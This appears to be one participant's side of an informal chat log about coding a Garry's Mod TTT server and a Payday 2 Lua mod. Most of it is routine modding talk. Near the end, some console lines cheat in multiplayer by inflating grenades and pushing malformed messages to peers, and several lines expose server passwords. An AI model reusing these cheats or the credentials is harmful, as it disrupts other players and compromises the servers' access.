+local RankIDs = {[1] = "Owner",[9] = "Silver Member",[10] = "Gold Member",[11] = "Donator",[13] = "Admin",[14] = "Mod",[15] = "Manager"}
+Make him finish that table
+I can make it so only mods+ can see current role
+no
+I mean
+role and kills
+so you can only see past
+until the end
+past rounds
+lets say you're on round 3
+you can only see 2 and 1 as guest
+makes the aimbot only point at tom
+yeh
+:I
+Whatever
+y u read everything
+tigo wanted
+http://puu.sh/2wDb5
+wat
+wat
+no idea
+http://puu.sh/2wDhs
+Whatever
+listip > removeip
+ITs the same way you remove karma bans
+listid in console
+and removeid
+yeh
+Its a new ingame report and level system
+its 1/2 way done
+!setrep player rep #
+no, but its the only on that displays right now
+!votelick
+e.e
+nice hat
+nice hat
+lulululul
+rain
+come here
+we need you
+new meta strats
+its actually too good
+other ts
+ringo rango
+I type all the time :s
+3:48 PM - ≛1st 🕓 John2143658709≛: rain
+Febuary 9th
+rain
+we need
+you
+rain!
+we need you bby
+rainycakes
+pls
+nice.
+almost and hour and still no rain on gmod
+2spooky4me
+spooky
+edge
+need an idea for a cool new server
+ttt with csgo physics would be cool
+yeah
+having 2 sets of hl2 open is bad
+still source game
+based of hl2
+show to make ttt gamemode
+its stuck on sandbox
+http://puu.sh/9u6O8/1b134e93a1.png
+had to make pull it from the garrysmod github Ls
+:s
+http://puu.sh/9u7py/5818e19900.jpg ez
+csadmin masterrace
+http://puu.sh/9vu2h/8152010c39.jpg
+iunno
+depends
+no pls
+Autographed- mabye
+yeah
+I mean
+a lot of shit can be added
+because the tables are dynamic
+should community event items be untradable
+rip mmr
+welcome to the trench
+lol okay
+better? http://puu.sh/9x93G/5f2ba8c1eb.png
+/everything/?
+or just weapons
+http://puu.sh/9yj3k/74592786a1.png
+im tempted http://ttt.net/
+eziest rares of all time
+http://puu.sh/9zmqW/5a7baa7470.png
+tttonline.us
+4 dollars
+http://puu.sh/9zmv1/7540013ec9.png
+what the actual fuck
+http://puu.sh/9zEnk/94ef3ccd04.png
+:D
+how about johns/notify.wav
+at the blazing speed of 20kb/s
+we ride
+uwotm8
+TF2 specific stuff:
+no idea
+do you do entity:Spawn() entity:Activate()
+spawn creates its hitbox and activate makes it collidable and abide by physics
+iirc
+also do you ever set its collision bounds
+also
+http://puu.sh/9AXCK/90406a39e4.jpg
+stat track counters
+http://puu.sh/9Bnme/ec376e9608.jpg
+lol
+you can probably add it to unusals if you do item 8 6 strangekills//#0
+"Times blinked"
+what do you mean
+just need to write the meta functions
+and ez
+hi
+what
+do you mean
+how to set the animations
+on a swep
+I'll get the ttt value
+one sec
+SWEP.PrimaryAnim = ACT_VM_PRIMARYATTACK
+make sure those are set
+get the ACT_VMs off the wiki
+http://wiki.garrysmod.com/page/Enums/ACT
+eh
+...that should make you happy
+things look weird when you can see the bones' positions
+go in sandbox
+use the bone changer tool
+uwot
+yes
+what about that
+idk how zs code works
+its claled by zs
+yeah
+its probably what calls the VElements
+what does it do
+exactly
+lol
+make SWEP.ShowViewModel = false
+http://puu.sh/9BFYk/eed353c8a1.jpg
+pls dont make a pug
+pun
+Strange part "Teammate kills"?
+oh boy
+here comes the rdm because you wanted the kill count
+then again
+poeple may also want to keep that really
+low
+so
+I could make it secretly always count the teammate kills
+and only show when the strange part is active
+SWEP.fingerprints = {}
+in the init
+if you
+want
+mhm
+yes
+it returns a player object
+what object thing exactly
+wait
+you want to make the manhack scanable
+okay
+one sec
+http://puu.sh/9BHnd/7c1ce62f82.png
+it should /always/ play dna_notfound unless its not a valid entity
+> then its not a valid entity
+wait
+do you have fingerprints set to {}
+in the manhack
+in the primary fire
+yeah
+wait
+yeah okay
+in the thing that spawns it
+when you do
+ents.create
+take that ent
+and set its fingerprints to {self.Owner}
+and make sure thats in the deploy thing
+and not the manhack initialize
+it isnt redeployable right
+oh also
+make sure thats in a if SERVER bracket
+if SERVER then manhack_ent.fingerprints = {self.Owner} end
+open up your weapon_ttt_wtester.lua
+in the terrortown/entities/weapons
+okey?
+line 113
+print(ent)
+and if you're real edgy
+line 100: print(ent and ent == NULL)
+to do a null check
+ie manhack got deactivated or somethign
+PrintTable(ent.fingerprints)
+after the first print you added
+yeah okay
+lemme look at the safedrop code
+from baseweapons
+nice!
+Pristine!
+no no wait
+lets do this
+one last attempt
+at glory
+set a local variable owner
+or something
+a local variable
+pls rain
+literally line one
+type local curSwepOwner
+okay
+now in SWEP:Equip
+does it exist
+the manhack one
+is there a SWEP:Equip() function
+okay
+good stuff then
+in your manhack
+do
+alright
+Im thinking rain
+okay
+I think this might work
+function SWEP:Equip(owner)
+function SWEP:Equip(owner)
+http://puu.sh/9BIIt/441bc32b6a.png
+I mean if its erroring
+then just add
+SWEP.Anim_initialize = function() return false end
+why delete turret
+does this new thing have ti?
+fancy
+"name""yes"
+local ent = ents.Create( "env_explosion" )
+SWEP.Icon = "VGUI/ttt/icon_manheckler"
+purple black icon
+pls help
+yes
+okay actually rpg_missle could be the rocket entity
+there should be blood splatter everywhere when it hits something
+function SWEP:SecondaryAttack()
+ents.Create
+rights
+right
+do you ever change the value for ents
+make sure
+and I hope you dont ever use a table called _G or _R
+Because you can use them
+d
+I dont beleive you know how though
+local spawnpos = turret:GetPos() + turret:GetAngles():Forward()*100
+vector1 + Vector(0,0,z)
+why reload
+http://puu.sh/9BQCQ/c8a53a11c9.png
+kek
+what
+that code?
+try it out
+lol
+??
+it should force whatever you want itto dl
+http://puu.sh/9Cyt0/d94f7c6160.zip
+rain can you come on and test the death messages
+?
+ok
+well
+that might work
+actually
+change it back
+and make ent:Fire
+into
+ent:Fire("Explode", 0, .1
+)
+to my computer?
+lol
+I would honestly give you that
+if I knew how
+well Im assuming I could make it only a specific directoru
+why would I zip it
+passwords.rtf all the way
+welp
+filezilla server doesntw ork
+and neither does the wikihow
+http://puu.sh/9CHpm/6e743d5e6b.png
+get on
+:c
+ok
+I have like 30 min
+do I just connect to that ftp
+with any client
+because I told you yesterday
+I was having a party
+movies
+wait where
+I have this
+http://puu.sh/9EAcQ/8df0f58f7d.png
+http://puu.sh/9EAe0/31aeb15e59.png
+http://puu.sh/9EAg4/445b6cb61c.png
+???
+done now what
+just change the .vtf to vmt
+in the addfile
+http://puu.sh/9EAzs/1b1232f0fe.png
+yeah still not working
+well can you help me still
+Like
+what do I resource.addfile
+the vtf or the vmt
+well idk how to fix this
+I dont wnat it to be lightmappedgeneric
+I know that for sure
+but idk what the shader that replace black with transparency is called
+oh
+lol.
+didnt work
+rip
+J7vkhN87NB pls dont break stuff
+no
+what do you mean
+lol
+http://puu.sh/9FCyq/5ba4fe76f0.jpg
+trade testing?
+ples rin
+trade chat edge
+addCommand("slay",function(ply, args, silent)
+what timer and how is it erroring
+is it a server timer or a client timer
+also
+rain pls
+well timers dont just randomly error rain
+/why/ is it erroring
+if self.Owner then /*do the emit*/ end
+wait actually
+what is self.Weaopon
+lol
+Weapon
+is that the SWEP or something?
+why not just self:EmitSound()
+rain
+stuff wont work
+?
+the world outside swep and sent scripting is completely different
+what are you trying to do
+iunno
+theres no documentation
+probably just do function SWEP:PreDrawViewModel(vm) vm:RotateAroundAxis(Angle(0,0,1),40) end
+try that
+see if it does anything
+actually that Angle(0,0,1) should be Vector(0,0,1)
+so Im coding an anticheat
+and I dont know if I want to autoban for speedhacking
+well how it works atm is
+if you're moving above a certin speed
+it resets your speed
+and flags you as going fast
+and if you, in the next tick, immedieatly after
+are moving 100 units faster than the cap, and are flagged
+then you get autobanned
+so bhop would be allowed and capped
+without bans
+but if you force your speed
+for 1 second straight
+then it bans
+theres also stuff like authkeys that have to be sent every few seconds
+or you get flagged as messing with interp and stuff
+I dont see how that wall works
+like
+does it force your client to take a screenshot and upload to server?
+looking at these
+I see what he's doing
+he replaces the lua_openscript_cl autocomplete function
+witha  function that screenshots
+lol
+can you give me a list of cheaty commands
+like sv_cheats
+and sv_allowcs_lua
+hey rain can you unban me
+!banlist > remove ban
+Im gonna jack devolved's fastdl
+holy shit I just realized I made a horrible pun
+pls dont hurt me
+are you gonna balance your guns or should I do that while I add stat tracks
+okay
+you know about the new values right
+SWEP.MovementPenalty = 0.03
+reset time is the time it takes for the guns crosshairs to recenter
+cone is the cone at full spray
+movementpenalty is added to the cone when moving at full speed
+I'll zip the base weapons
+http://puu.sh/9IU95/ac716c20b5.zip
+no
+Disconnect: Banned permanantly for reason t..
+pls unbun
+top kekked
+I should make it do 3 checks
+or 4 checks
+yes pls
+kek
+okay yeah
+rin help me test voting
+9993
+uwot
+I got 9993 ammo
+probably will go with these people
+https://www.xenonservers.com/
+lol
+40$ a month for 40 slot 500mbit/s
+ez
+nvm gonna go with nfo
+server name?
+ik
+changed my mind
+kek
+yeah
+also
+well nvm
+wow a free trial
+edgy
+free for 2 days
+Perfecg
+honestly
+I could mabye get a lot
+in the first weeks
+eziest rares of my life
+http://puu.sh/9LOFL/5d1247f268.png
+I forget
+partydomettt.game.nfoservers.com
+server_partydomettt
+SeySGnLHzejSek4jQRcU
+that is infact a hack, rain
+also why is it sandblox
+rain can you help me test admin reply
+where is that
+No idea
+I added a new traitor item
+sure
+password vsu7uh4ef3; connect johnsttt.g.nfoservers.com
+yes
+in fact
+I would buy it for you
+if you cant
+rain come on
+7===D
+?
+wtf does realistic minegame mean
+oh
+alright
+one sec
+I was playing phoenix wright
+;c
+...and?
+"And there is a login"
+wat
+yeah gl guessing the password
+yeah
+http://puu.sh/av1KW/f51774c649.png cant do anything rip
+"Remote Administration settings will override the security inbound policy."
+well yeah but you need my mac address and a password that only verizon knows
+so yeah
+kek
+uwotrain
+yeah pl
+ko
+yes
+how do I do color text
+http://puu.sh/erDIz/16959360b7.png
+http://puu.sh/erDFR/c143674b66.png
+wat
+arent you tidlerain on github
+tfw parents think im a hacker because this http://puu.sh/eWedz/6c5b4df674.png
+what
+vim is the most versatile text editor that exists
+so yes
+on the left
+is my vimrc
+colo desert
+is the color mode I have
+syntax enable turns it on
+and then I have a lua syntax script downloade
+significantly faster to code in
+but I dont use the find in files functions
+which is why I have notepad
+well iunno rain
+you can turn that 10%
+into a 3%
+if you use vim
+just like download vim
+and then ask me for a key combo
+and eventually you'll be good
+like
+A is move to end of the line and enter insert mode
+o is insert line below and enter insert
+ea is move to end of word and enter insert
+99% of what I use
+thats not macros
+hjkl is eh imo
+yes
+vram boys
+tfw I dont care
+tfw you wont accept my 670
+yolo
+inb4 you dont have enough pci lanes
+250 watt psu
+john are you making devoadmin3
+go cart racing
+http://puu.sh/fu2Z7/eb58ff1741.png
+you mean tf2 in a nutshell
+rain pls learn lua nd hlep me
+how about i just get the code from tfw
+2
+and convert it to lua
+http://puu.sh/fu365/254294cc10.png
+it does
+?
+http://puu.sh/fWagn/7820e9bd53.png
+global variables arent persistant
+so gsm:update may get unloaded because it isnt used
+yeah
+its needs data from the host
+managers.network:session():send_to_peers_syched("testh", "asdf")
+send_to_peers_synched
+managers.network:session():send_to_peers_synched("testh", "asdf")
+managers.network:session():send_to_peers_synched("sync_warn_about_civilian_free", 3)
+managers.network:session():send_to_peers_synched("sync_grenades", "frag", 10)
+s
+managers.network:session():send_to_peers_synched("sync_grenades", "frag", "f")
+managers.network:session():send_to_peers_synched("sync_warn_about_civilian_free", 3)
+managers.network:session():send_to_peers_synched("sync_grenades", 7)
+managers.network:session():send_to_peers_synched("sync_grenades", "frag", 7)
+managers.network:session():send_to_peers_synched("sync_grenades", "frag", "lmao")
+managers.network:session():send_to_peers_synched("sync_grenades", "$!1~asdf~3", 7)
+https://github.com/JamesWilko/GoonMod/tree/master/
+jhud.hook("HUDChat", "receive_message", function(s, ...) _(...) end)
+_(managers.chat:_receive_message(1, "ASDF", "test", tweak_data.system_chat_color))
+asdf: test
+jhud.hook("ChatManager", "_receive_message", function(self,...) jhud.log(...) end)
+http://puu.sh/fYjT7/e608edd66f.png
+KeyBindings:
+_(managers.player._equipment.selections[1])
+_(managers.player.equipment)
+_(managers.player._equipment)
+_("asdf"
+_ "asdf"
+jhud.log("tseT")
+jhud.log(_(managers.player._equipment.selections[1].equipment))
+sdfs
+jhud.log(managers.player._use(.selections[1].use_function)
+jhud.log(managers.player._equipment.selections[1].use_function)
+managers.player._equipment.selections[1].use_function = "use_ecm_jammer"
+jhud.infamy:setInfamy(5)
+_(managers.network:session():peers())
+jhud.log(managers.network:session():peers()[1])
+]
+]:name()
+ok
+the colon makes the first argument the object jhud.infmay
+so jhud.infamy.setInfamy(jhud.infamy, 7) = jhud.infamy:setInfamy(7)
+hey rain read the chat
+rain pls
+rain
+rain
+raisenr
+airnesrien
+ianirrniaeni
+a
+ni
+inar
+inrai
+nr
+ainr
+ian
+rina
+rina
+rinar
+ianr
+ainra
+irna
+rinar
+inra
+ina
+ok rain
+yeah
+dont do that
+obnly ever change cfg.lua
+because it doesnt get overwritten every update
+o.m.assault.uppercase = false
+o.m = module
+same with binds
+dont use jhbinds
+you see in jhbinds
+the --[[nummber]
+right
+okay
+in cfg.lua
+b.voice[number][1] = key
+okay rain
+okay rain
+with the new autoupdator
+you're gonna be replacing that a lot
+if you dont exclude it
+it always needs your permission
+:s
+lemme make a new update with the stuff
+rain pls
+"theres no way out of this crew"
+or some shit
+uhh
+okay one sec
+ready up
+okay
+does it say infamy by my name
+okay
+it should say
+thers an update
+/update
+its gonan be a whole lot of us restarting
+so ready up
+pls rian
+nothing below that
+the %total, %received, ...
+scrnshot
+hmm
+delete the update folder
+in the johnhud directory
+no
+right so
+its deleteed right
+therse no update folder
+run /update -d
+and see if the version file is updated
+hmm
+one sec
+okay do a manual update
+from johnhud/dev
+ready up
+ez
+join
+yes
+no
+mabye
+I dont think so
+make sure payday has access to write to the symlinked folder
+idk if it does by default
+open up a command prompt in the payday symlink folder
+and run curl google.com > google.html
+well try what i just put
+okay do it in the dev folder
+?
+RAIN
+WHERE IS JOHNHUD
+GO THERE
+RUN CURL
+curl https://www.google.com/?gws_rd=ssl > google.html
+open google.html
+cool
+so that works
+you should get a curl log in your payday console
+http://puu.sh/ga8hb/bd50edda36.png
+when doing /update -d -f
+well therse the issue
+so the question is
+who
+why
+what
+when
+how
+rain
+why
+how about you definitly have thw right version
+the only issue is that payday doesnt work
+so
+go to payday console
+okay
+_(os.execute("curl https://www.google.com -k"))
+it prints out googles stuff
+no
+tfw it worked
+viruses
+okay
+okay.
+rain
+I want you to know
+if this becomes a big deal
+the hud that is
+then people will
+because people will see how
+i'll just encrypt it if its that bad
+ripalpapi
+good
+a return status of 0 for echo means no error
+http://www.computerhope.com/xdoseror.htm
+not really
+but join me on a working hook
+so i can test this update
+a
+run /update
+then go to modules/autoupdate.lua
+does /update crash you or something
+no
+look at the file
+and see if it changed
+just open autoupdate
+and read line 49
+to me
+hooray it works
+idk how hoxhud works
+okay
+can you join again
+and then we do a heist loop thing
+and mabye it works
+rip
+join and /version
+!?
+actually
+autoupdate.lua
+line 50
+is it self:createVerFile()
+or end
+yeah then it works
+cool
+update?
+do et
+theres a secret society of people who know the lua source in and out on reddit
+ok
+is it stealth now
+as in'
+the last thing send
+ok
+what do you mean
+oh
+yeah its not hard
+i'll make a quick test script
+ok
+i may just make a function to scan for a varible
+in the whole of the code
+restart
+nice
+rip drivers
+riperino
+ded?
+run Global.game_settings.difficulty = "easy"
+and restart
+the hesiut
+nicer
+http://puu.sh/gaiTe/2f56b42386.png
+max level is 100
+wtf
+got it to work
+easy
+idk what is different
+no
+hmm
+one sec
+lemme try more things
+playing singleplayer offline add signifcant buffs to you
+nice
+http://puu.sh/gajy5/3cb070931e.png
+thats part
+theres more things that are based off singleplayer though
+tahts the main thing though
+gasp http://puu.sh/gak0W/b9ab718678.png
+I guess it means the opposite for them
+"my folder still says dota 2 beta"
+hey rain you should hire people to translate for me
+thanks bye
+friend
+dont worry about ti
+ye
+asegaesg
+rain
+rain
+use_armor_kit
+armor_kit
+b.voice[number][1] = key
+\[.-\]
+\[.+\]
+[.-]
+[a-zA-Z_0-9]+
+: [a-zA-Z_0-9]{3,9}
+ez
+WOW
+jeez rain
+git commit -m "message"
+["num 5"] = "f354_any"
+Global.game_settings.difficulty = "easy"
+or whatever
+managers.job:on_buy_job("family", 2) ; MenuCallbackHandler:start_job{job_id = "family", difficulty = 2}
+do that
+mabye
+idk
+6 id DW
+5 ovk
+4 vhard
+3 hard
+2 normal
+1 easy
+yes.
+H&T bank
+you can do any heist you want
+thats just the only one I remember
+lol
+ambience_ext_downtown_large_day
+loadout_music
+occasionals_city_traffic
+those look interesting
+what is that second one
+tfw already done
+too bad its just dumb bugfixes
+http://puu.sh/grdpS/36c1177107.png
+(a or b) and not (a and b)
+him getting caught
+he stood near the glass
+ayy
+loco or jduge
+if you have mag plus
+izhma
+orr
+if you have m1014
+that
+are you coming
+hoxout ovk?
+okay then
+I guesswe'll just go
+function PlayerManager:update_grenades_amount_to_peers(grenade, amount)
+managers.player:update_greandes_amount_to_peers("frag", 100)
+managers.player:_set_grenade{grenade = "frag", amount = 1000}
+now?
+I have 1000 to me
+managers.job._global.saved_ghost_bonus = jhud.digest(.2)
+http://nushtel.com/cable-internet.htm
+http://steamcommunity.com/id/jakegame/stats/PAYDAY2
+Hey rain you wanna cheat me a hm
+do e
+t'
+collectgarbage()
+I dont wanna use stamina bar
+and also thinking about writing an alert system type thing
+im gonna leave in the text option thing
+and gonna make a custom bar
+its not that hard
+probably just on the left
+yeah
+planning to
+but I cant find time remaining
+?
+no inspire builds
+ayy lmao
+github
+find me a better smoothing function
+you know like
+basic functions
+from math right
+y = x^2 or whatever
+okay
+do you know basic calculus
+ie how to integrate
+if not you can probably just google it anyway
+or ask wolframalpha
+but basically
+you want a velocity function
+like y = sqrt(1-x^2)
+where its fast and then gets slower
+and then you integrate it
+and thats the position function
+so yeah
+heres that
+which I was thinking of using
+http://puu.sh/gRqgD/4f41bc9ab9.png
+and heres what I ended up using
+which is a bit drastic
+http://puu.sh/gRqmC/421cc84b59.png
+it updates as soon as it does in the code itsself
+like ~ every .5 seconds
